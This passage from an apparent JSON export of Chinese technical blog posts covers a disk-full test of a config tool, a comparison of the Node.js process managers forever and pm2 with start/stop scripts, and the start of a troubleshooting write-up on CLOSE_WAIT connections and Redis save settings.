\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\nconfig: write: No space left on device\nconfig: save config file(/mnt/disk/test.json) failed\ndata: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n$ sudo ~/Opensource/config/config /mnt/disk/test.json get name\nconfig: get items(name,,,,,) from config file(/mnt/disk/test.json) failed\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">修复后</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n磁盘空间不足写配置不会对配置文件造成实质影响\n</p>\n\n<pre class=\"example\">\n$ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig\nname: libconfig\n$ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000\ndd: error writing ‘/mnt/disk/other.data’: No space left on device\n6821889+0 records in\n6821888+0 records out\n6821888 bytes (6.8 MB) copied, 7.6254 s, 895 kB/s\n$ sudo ~/Opensource/config/config /mnt/disk/test.json set data \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\nconfig: write: No space left on device\nconfig: save config file(/mnt/disk/test.json) failed\ndata: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n$ sudo ~/Opensource/config/config /mnt/disk/test.json get name\nname: libconfig\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"sec-2-4\">清除测试环境</h3>\n<div class=\"outline-text-3\" id=\"text-2-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo umount /dev/loop0p1\nsudo losetup -d /dev/loop0\nsudo rmdir /mnt/disk\nsudo rm ~/Examples/disk.img\n</pre>\n</div>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n《<a href=\"http://www.oschina.net/translate/reliable-file-updates-with-python\">使用 Python 进行稳定可靠的文件操作</a>》</p>\n</div>\n</div>\n"
},
{
  "title": "后台服务监护工具：forever与pm2",
  "timestamp": "2015-07-25 00:15:00",
  "tags": [
    "node",
    "pm2"
  ],
  "body": "<p>\n使用后台服务监护工具有很多好处：\n</p>\n\n<ul class=\"org-ul\">\n<li>程序崩溃时自动拉起\n</li>\n\n<li>程序日志聚合（你的系统有多个模块或多个进程的时候很有必要）\n</li>\n\n<li>代码更新时自动重启服务\n</li>\n</ul>\n\n<p>\nnode.js下最常用的后台服务监护工具有：<a href=\"https://github.com/nodejitsu/forever\">forever</a> 、<a href=\"https://github.com/Unitech/pm2\">pm2</a> 。\n</p>\n\n<p>\n<a href=\"https://github.com/nodejitsu/forever\">forever</a> 先出现，<a href=\"https://github.com/Unitech/pm2\">pm2</a> 后出现功能更丰富，下面是特性对比：\n</p>\n\n<table border=\"2\" cellspacing=\"0\" cellpadding=\"6\" rules=\"groups\" frame=\"hsides\">\n\n\n<colgroup>\n<col  class=\"left\" />\n\n<col  class=\"left\" />\n\n<col  class=\"left\" />\n</colgroup>\n<thead>\n<tr>\n<th scope=\"col\" class=\"left\">Feature</th>\n<th scope=\"col\" class=\"left\">Forever</th>\n<th scope=\"col\" class=\"left\">PM2</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class=\"left\">Keep Alive</td>\n<td class=\"left\">✔</td>\n<td class=\"left\">✔</td>\n</tr>\n\n<tr>\n<td class=\"left\">Coffeescript</td>\n<td class=\"left\">✔</td>\n<td class=\"left\">&#xa0;</td>\n</tr>\n\n<tr>\n<td class=\"left\">Log aggregation</td>\n<td class=\"left\">&#xa0;</td>\n<td class=\"left\">✔</td>\n</tr>\n\n<tr>\n<td class=\"left\">API</td>\n<td class=\"left\">&#xa0;</td>\n<td class=\"left\">✔</td>\n</tr>\n\n<tr>\n<td class=\"left\">Terminal monitoring</td>\n<td class=\"left\">&#xa0;</td>\n<td class=\"left\">✔</td>\n</tr>\n\n<tr>\n<td class=\"left\">Clustering</td>\n<td class=\"left\">&#xa0;</td>\n<td class=\"left\">✔</td>\n</tr>\n\n<tr>\n<td class=\"left\">JSON configuration</td>\n<td class=\"left\">&#xa0;</td>\n<td class=\"left\">✔</td>\n</tr>\n</tbody>\n</table>\n\n<p>\n我在3个项目中使用 <a href=\"https://github.com/nodejitsu/forever\">forever</a> ，多次重启出错后，决定转向 <a href=\"https://github.com/Unitech/pm2\">pm2</a> ，目前我已经在两个较小的项目中成功使用 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"https://github.com/nodejitsu/forever\">forever</a></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">npm install -g forever\n</pre>\n</div>\n</li>\n\n<li>配置\n\n<p>\n启动脚本\n<code>start.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">PATH</span>=$<span style=\"color: #ffcc66;\">PATH</span>:<span style=\"color: #cc99cc;\">`pwd`</span>/node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/../node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/node_modules/forever/bi<span style=\"text-decoration: underline;\">n:/usr/local/node/bin</span>\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">NODE_ENV</span>=${<span style=\"color: #ffcc66;\">NODE_ENV</span>:-production}\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">NODE_CONFIG_DIR</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/config\n\n<span style=\"color: #ffcc66;\">SCRIPT</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/src/index.js\n<span style=\"color: #ffcc66;\">LOGFILE</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/run.log\n\n<span style=\"color: #ffcc66;\">running</span>=<span style=\"color: #cc99cc;\">`forever list | grep \"$SCRIPT\" | grep -v grep | wc -l`</span>\n\n<span style=\"color: #99cc99;\">if</span> [ $<span style=\"color: #ffcc66;\">running</span> -lt 1 ]; <span style=\"color: #99cc99;\">then</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   forever start --spinSleepTime=10000 --killSignal=SIGINT --pidFile=<span style=\"color: #cc99cc;\">`pwd`</span>/run.<span style=\"text-decoration: underline;\">pid -l $</span><span style=\"color: #ffcc66; text-decoration: underline;\">LOGFILE</span><span style=\"text-decoration: underline;\"> -a -w --watchDirectory=</span><span style=\"color: #cc99cc; text-decoration: underline;\">`pwd`</span><span style=\"text-decoration: underline;\">/src --watchIgnore=</span><span style=\"color: #66cccc; text-decoration: underline;\">\".svn/*\"</span><span style=\"text-decoration: underline;\"> </span><span style=\"color: #66cccc; text-decoration: underline;\">\"$SCRIPT\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> -e <span style=\"color: #66cccc;\">\"\\nRunning.\"</span>\n<span style=\"color: #99cc99;\">else</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> -e <span style=\"color: #66cccc;\">\"\\nAlready running.\"</span>\n<span style=\"color: #99cc99;\">fi</span>\n\nforever list | grep <span style=\"color: #66cccc;\">\"$SCRIPT\"</span>\n</pre>\n</div>\n\n<p>\n停止脚本\n<code>stop.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">PATH</span>=$<span style=\"color: #ffcc66;\">PATH</span>:<span style=\"color: #cc99cc;\">`pwd`</span>/node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/../node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/node_modules/forever/bi<span style=\"text-decoration: underline;\">n:/usr/local/node/bin</span>\n\n<span style=\"color: #ffcc66;\">SCRIPT</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/src/index.js\n\nforever stop <span style=\"color: #66cccc;\">\"$SCRIPT\"</span>\n</pre>\n</div>\n\n<p>\n重启脚本     \n<code>restart.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">PATH</span>=$<span style=\"color: #ffcc66;\">PATH</span>:<span style=\"color: #cc99cc;\">`pwd`</span>/node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/../node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/node_modules/forever/bi<span style=\"text-decoration: underline;\">n:/usr/local/node/bin</span>\n\n<span style=\"color: #ffcc66;\">SCRIPT</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/src/index.js\n\nforever restart <span style=\"color: #66cccc;\">\"$SCRIPT\"</span> || ./start.sh\n</pre>\n</div>\n</li>\n\n<li>用法\n\n<p>\n启动\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./start.sh\n</pre>\n</div>\n\n<p>\n停止\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./stop.sh\n</pre>\n</div>\n\n<p>\n重启\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./restart.sh\n</pre>\n</div>\n</li>\n\n<li>缺点\n\n<ul class=\"org-ul\">\n<li>程序退出过程中的日志无法捕获\n\n<p>\n参见：<a href=\"https://github.com/foreverjs/forever/issues/385#issuecomment-115163346\">no logging after graceful shutdown #385</a>\n</p>\n\n<p>\n应该是forever通过信号通知程序退出后，不再捕获程序的日志输出，程序退出的这段时间内日志丢失。\n</p>\n\n<p>\n一个补丁方案：程序收到forever的退出信号后将日志直接写到日志文件（正常情况下是由forever捕获程序的错误输出写日志文件）。\n</p>\n</li>\n\n<li>重启可能失败\n\n<p>\n代码更新后，forever会发信号重启进程，但是程序始终重启不成功，出现大量下面的日志：\n</p>\n<pre class=\"example\">\nError: bind EADDRINUSE\n</pre>\n\n<p>\n怀疑跟node.js的cluster中master自动拉起slave的行为相冲突，此时只有一个forever实例在运行，这种情况占比很高。\n</p>\n\n<p>\n另外crontab中调用start.sh也可能和forever相冲突，当node全退出时，可能启动多个forever实例，这种情况占比稍低。\n</p>\n\n<p>\n另外一种情况是node.js出问题了CPU及内存100%占用，此时普通的kill杀不死（必须得kill -9），forever误认为已成功结束node.js进程，\n然后拉起新的进程。\n</p>\n</li>\n\n<li>未内置支持开机启动\n\n<p>\n可以直接放在crontab每分钟调用一次 <code>start.sh</code> 来实现，万一连forever进程都挂了，可以全部拉起来。\n开机启动不内置则意味着一百个人有一百种做法，带来不必要的争议。\n</p>\n</li>\n\n<li>允许程序同时启动多个实例\n\n<p>\nforever未对启动的程序进行唯一性标识，导致程序可能意外启动多个实例，多个实例之间往往相冲突，降低了系统可用性。\n</p>\n\n<p>\n而由程序自已来实现单实例运行是很困难的，forever会不断地拉起退出的多余副本。\n</p>\n</li>\n\n<li>未内置支持cluster以及优雅重启\n\n<p>\n部署代码重启程序过程中会停止服务几秒钟。\n</p>\n</li>\n</ul>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https://github.com/Unitech/pm2\">pm2</a></h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">npm install -g pm2\n</pre>\n</div>\n</li>\n\n<li>配置\n\n<p>\n以 <a href=\"https://github.com/tangxinfa/upload-fiddle\">upload-fiddle</a> 项目为例。\n</p>\n\n<p>\n统一配置其它脚本需要的环境变量\n<code>.bashrc</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">PATH</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/../node/bin:<span style=\"color: #cc99cc;\">`pwd`</span>/node_modules/pm2/bin:/usr/loc<span style=\"text-decoration: underline;\">al/node/bin:$</span><span style=\"color: #ffcc66; text-decoration: underline;\">PATH</span>\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">NODE_ENV</span>=${<span style=\"color: #ffcc66;\">NODE_ENV</span>:-production}\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">NODE_CONFIG_DIR</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/config\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">APP_NAME</span>=<span style=\"color: #66cccc;\">\"upload-fiddle\"</span>\n<span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">APP_SCRIPT</span>=<span style=\"color: #cc99cc;\">`pwd`</span>/src/index.js\n</pre>\n</div>\n\n<p>\n启动脚本\n<code>start.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #cc99cc;\">source</span> .bashrc\npm2 --node-args=<span style=\"color: #66cccc;\">\"--harmony\"</span> -n <span style=\"color: #66cccc;\">\"$APP_NAME\"</span> start <span style=\"color: #66cccc;\">\"$APP_SCRIPT\"</span> -i 0 --watch <span style=\"color: #66cccc;\">\"`pw</span><span style=\"color: #66cccc; text-decoration: underline;\">d`/src/*.js\"</span>\n</pre>\n</div>\n\n<p>\n停止脚本\n<code>stop.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #cc99cc;\">source</span> .bashrc\npm2 --node-args=<span style=\"color: #66cccc;\">\"--harmony\"</span> stop <span style=\"color: #66cccc;\">\"$APP_NAME\"</span>\n</pre>\n</div>\n\n<p>\n重启脚本\n<code>restart.sh</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #cc99cc;\">source</span> .bashrc\npm2 --node-args=<span style=\"color: #66cccc;\">\"--harmony\"</span> restart <span style=\"color: #66cccc;\">\"$APP_NAME\"</span>\n</pre>\n</div>\n</li>\n\n<li>用法\n\n<p>\n启动\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./start.sh\n</pre>\n</div>\n\n<p>\n停止\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./stop.sh\n</pre>\n</div>\n\n<p>\n重启\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./restart.sh\n</pre>\n</div>\n</li>\n\n<li>缺点\n\n<ul class=\"org-ul\">\n<li>程序退出过程中的日志无法捕获？\n\n<p>\n不一定。使用 <code>pm2 stop</code> 会有同样的问题，但是pm2支持优雅退出（ <code>pm2 gracefulReload</code> ），此时不但退出过程中的日志能够正常捕获，而且可以实现服务0停机时间。\n</p>\n</li>\n\n<li>重启可能失败\n\n<p>\n是的。=pm2 restart= 并没有采用激进的措施（kill -9）确保旧进程结束。重现步骤：用gdb调试运行中的node进程（gdb node &lt;PID&gt;后不执行任何gdb命令），然后用pm2 restart重启服务，此时旧的进程杀不死，新的进程被创建。\n</p>\n</li>\n\n<li>允许程序同时启动多个实例\n\n<p>\npm2对启动的程序进行了唯一性标识，但是它将启动的信息保存在了当前用户的home目录下（~/.pm2），所以使用其它帐号时还是有能够启动多个程序实例，对于这一点forever也存在同样的问题。\n</p>\n\n<p>\n对于服务器来说，多帐号是常态，应该默认防止这种问题发生。\n</p>\n</li>\n</ul>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">程序写日志相关</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n用c/c++写日志的时候我一般都会使用日志库，如：<a href=\"http://logging.apache.org/log4cxx/index.html\">log4cxx</a> 、<a href=\"https://github.com/HardySimpson/zlog\">zlog</a> ，这些日志库容易使用而且很稳定，支持将日志写到文件或控制台，支持按大小、日期分割日志文件，支持限定日志文件数、占用空间。\n</p>\n\n<p>\n但是node.js下最好的写日志方式其实是将日志直接输出到错误输出（stderr），由 <a href=\"https://github.com/nodejitsu/forever\">forever</a> 、<a href=\"https://github.com/Unitech/pm2\">pm2</a> 这样的后台服务监护工具来写日志文件。这是因为node.js做为一种动态语言，容易出现异常，特别是前期开发阶段，很多分支没有跑到，往往是写日志的语句出错，此时日志库是很难做到将异常时程序的调用堆栈写到日志文件中的，由台后服务监护工具来做能确保万无一失。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li>《<a href=\"http://se77en.cc/2013/06/27/goodbye-node-forever-hello-pm2-translation/\">告别node-forever,拥抱PM2</a>》\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "linux服务器出现大量CLOSE_WAIT状态的连接",
  "timestamp": "2015-08-02 03:21:00",
  "tags": [
    "linux",
    "node",
    "redis"
  ],
  "body": "<p>\n昨天服务器停止服务，node.js进程耗光了服务器的内存及CPU，node.js进程卡死无法被 <code>kill</code> 掉，最后要来root帐号密码，直接 <code>kill -9</code> 才结束掉进程。\n</p>\n\n<p>\n再次鄙视一下 <a href=\"https://github.com/nodejitsu/forever\">forever</a> ，杀不掉原来的 node.js 进程组也就罢了，竟然又拉起了一套新的 node.js 进程组。\n</p>\n\n<p>\n统计了一下 <code>10</code> 万个fd都耗光了，其中 <code>9</code> 万多个为 <code>CLOSE_WAIT</code> 状态，此时服务器已经无法响应请求。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">CLOSE_WAIT 状态介绍</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n先看一副TCP连接关闭的状态图（ <a href=\"http://intronetworks.cs.luc.edu/current/html/tcp.html#index-29\">来源</a> ）：\n</p>\n\n\n<div class=\"figure\">\n<p><img src=\"../static/tcp_normal_close.png\" alt=\"tcp_normal_close.png\" />\n</p>\n</div>\n\n<p>\n被动关闭一方才会出现 <code>CLOSE_WAIT</code> 状态，由于被动关闭方未调用 <code>close</code> 关闭socket导致，问题肯定是由服务器代码引起。\n</p>\n\n<p>\n检测到对端socket关闭然后关闭本端socket是由 node.js 自行完成的，最大的可能是没有机会执行 <code>close</code> 。\n</p>\n\n<p>\n我们的应用客户端与服务器有一个tls长连接，当连接断开时客户端会等待3-10秒后尝试重连服务器，如果服务器出现卡顿会导致客户端频繁重连，\n</p>\n\n<p>\n如果服务器来不及关闭这些连接，则会出现 CLOSE_WAIT 状态的连接，占用大量文件描述符，减少 CLOSE_WAIT 超时时间能够在一定程度上缓解这个问题，\n</p>\n\n<p>\n但是对于我们这种长连接的环境，大量CLOSE_WAIT是问题的表象，而非根源。\n</p>\n\n<p>\n参考：《<a href=\"http://lvxuehu.iteye.com/blog/452487\">解决CLOSE_WAIT 问题</a>》\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">内存及CPU占用彪升问题</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n伴随着 CLOSE_WAIT 出现的状况是 node.js 进程内存及CPU占用超高，单node.js进程内存占用达到 1.5G，CPU占用 90% 以上，此时应该会导致 node.js 响应慢，\n来不及关闭连上来的socket。\n</p>\n\n<p>\n所以解决问题的关键就是：找出什么原因导致 node.js 内存及CPU 100%占用。\n</p>\n\n<p>\n想到的可能是redis负载过高引起，从运维监控图上可以看出一些蹊跷，node.js出问题时redis的连接数也同样彪升，而出问题的机器上刚好就是跑redis的机器，\n另一台服务器一直相安无事，没有跑redis。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">一次午夜故障元凶浮出水面</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n在晚上两点的时候服务出现问题，同样的现象，特别留意了一下redis的统计，请求速度很低，只有1200，平时都是5000。偶然在进程列表中发现了 redis-rdb-bgsave 的身影，\n不断地执行ps看进程列表，发现 redis-rdb-bgsave 进程不断地出现，查看redis的持久化配置如下：\n</p>\n\n<pre class=\"example\">\nsave 900 1\nsave 300 10\nsave 60 10000\n</pre>\n\n<p>\n我们的系统有大量的redis，1分钟肯定过万，这样redis持久化变是常态了，而且由于用的是机械硬盘，持久化肯定会引起系统卡顿，先将它调整为15分钟最多持久化一次：\n</p>\n\n<pre class=\"example\">\nconfig set save \"900 